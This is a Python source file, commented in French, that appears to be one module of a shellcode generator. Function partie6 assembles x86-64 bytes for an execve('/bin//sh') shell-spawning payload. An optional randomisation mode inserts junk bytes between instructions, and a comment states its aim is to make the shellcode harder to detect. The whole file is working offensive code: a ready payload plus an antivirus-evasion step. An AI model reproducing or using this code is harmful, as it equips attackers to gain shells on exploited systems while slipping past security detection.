#!/usr/bin/env python3
import random
from func_instru import *

def partie6(fullrdm):

   # PARTIE : GENERATION SHELL
    ## Exemple de code asm : 
    """
	xor rsi, rsi
	push rsi
	mov rdi, 0x68732f2f6e69622f
	push rdi
	push rsp
	pop rdi
	mov al, 59
	cdq
	syscall
    """

    xorrsi = randomxor('rsi') # xor rsi, rsi 
    pushrsi = "\\x56" # push rsi
    movrdi = "\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68" # mov rdi, 0x68732f2f6e69622f
    pushrdi = "\\x57" # push rdi
    pushrsp = "\\x54" # push rsp
    poprdi = "\\x5f"  # pop rdi 
    moval = "\\xb0\\x3b" # mov 0x3b,al
    cdq = "\\x99" # cltd
    syscall = "\\x0f\\x05" # syscall 

    resultat_concat = xorrsi + pushrsi + movrdi + pushrdi + pushrsp + poprdi + moval + cdq + syscall

    # Ajout d'aléatoire si l'argument --random = yes
    ### Cette section brise certains motifs pour rendre le shellcode plus difficile à détecter.   
    if fullrdm == 'yes':  
        y = random.randint(0, 5)

        match y : 
            case 1 :
                resultat_concat = xorrsi + pushrsi + movrdi + pushrdi + pushrsp + poprdi + moval + cdq + syscall
            case 2 : 
                resultat_concat = xorrsi + pushrsi + full_random() + movrdi + pushrdi + pushrsp + poprdi + moval + cdq + syscall
            case 3 :
                resultat_concat = xorrsi + pushrsi + full_random() + movrdi + pushrdi + full_random() + pushrsp + poprdi + moval + cdq + syscall
            case 4 :
                resultat_concat = xorrsi + pushrsi + full_random() + movrdi + pushrdi + full_random() + pushrsp + poprdi + moval + full_random() +cdq + syscall
            case 5 :
                resultat_concat = xorrsi + full_random() + pushrsi + full_random() + movrdi + full_random() + pushrdi + full_random() + pushrsp + poprdi + moval + cdq + syscall

    return resultat_concat